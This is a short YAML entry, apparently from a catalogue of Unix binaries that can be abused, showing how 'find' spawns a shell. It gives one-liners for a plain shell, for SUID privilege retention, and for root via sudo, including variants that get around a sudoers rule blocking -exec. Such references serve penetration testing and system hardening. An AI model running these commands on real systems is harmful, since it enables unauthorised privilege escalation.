---
functions:
  shell:
    - code: find . -exec /bin/sh \; -quit
  suid:
    - code: ./find . -exec /bin/sh -p \; -quit
  sudo:
    - description: The most common way
      code: sudo find . -exec /bin/sh \; -quit
    - description: Alternatives if the usage of -exec is blocked in /etc/sudoers by e.g. !/usr/bin/find * -exec *
      code: |
        sudo find . -ok /bin/sh \; -quit
        sudo find . -execdir /bin/sh \; -quit
        sudo find . -okdir /bin/sh \; -quit
---
